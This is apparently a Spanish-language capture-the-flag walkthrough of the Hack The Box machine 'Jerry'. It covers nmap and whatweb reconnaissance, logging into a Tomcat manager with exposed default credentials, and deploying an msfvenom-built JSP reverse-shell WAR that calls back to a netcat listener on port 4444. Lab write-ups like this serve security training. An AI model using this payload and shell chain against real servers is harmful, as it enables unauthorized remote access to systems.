---
layout: post
author: Sergio Salgado
---

|     Iformation         |      Link          |
|:-----------------------|:-------------------|
| Name                   | Jerry              |
| Os                     | Windows            |
| Difficulty             | Easy               |
| Points                 | 0                  |
| IP                     | 10.10.10.95        |


## [](#header-2)Reconocimiento

Primero utilizaremos la herramienta que hace la identificación de conexión silenciosa y reconocimiento del sistema al que nos presentamos.

![Scan 1](/assets/images/Jerry/scan1.png)

### [](#header-3)NMAP   

El primer escaneo rápido con nmap, para poder agilizar mientras más búsquedas o búsqueda de vulnerabilidades sobre esos puertos.

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv 10.10.10.95
```

![nmap 1](/assets/images/Jerry/nmap1.png)

El segundo escaneo, ya un poco más profundo será:

```s
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.95 -oG allPorts
```

![nmap2](/assets/images/Jerry/nmap2.png)

Después de tener los puertos, se puede hacer un escaneo ahora directo a los puertos con:

```s
sudo nmap -sCV -p8080 10.10.10.95 -oN targeted
```

![nmap3](/assets/images/Jerry/nmap3.png)

Vamos a lanzarle un whatweb directo al puerto.

```s
whatweb 10.10.10.95:8080
```

![whatweb](/assets/images/Jerry/whatweb.png)

Al presentarse el tomcat podemos intentar entrar al /admin.html. Esta no es su ruta, pero al intentar entrar nos despliega las credenciales para entrar como ejemplo de autenticacion.

Una vez dentro vemos que podemos meter nuestro propio archivo WAR malicioso.

```s
msfvenom -l payloads | grep java
#Usamos el payload java/jsp_shell_reverse_tcp, que nos permite estar en escucha por netcat en el puerto 4444
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.29 LPORT=4444 -f war -o shell.war
```

Podemos ir poniendonos en escucha:

```s
rlwrap nc -nlvp 4444
```

![Access 1](/assets/images/Jerry/access1.png)

Hemos ganado acceso, y si nos vamos a la carpeta de Administrator, veremos las flags de administrador y de usuario en un solo archivo! JAJA.

![Powned](/assets/images/Jerry/powned.png)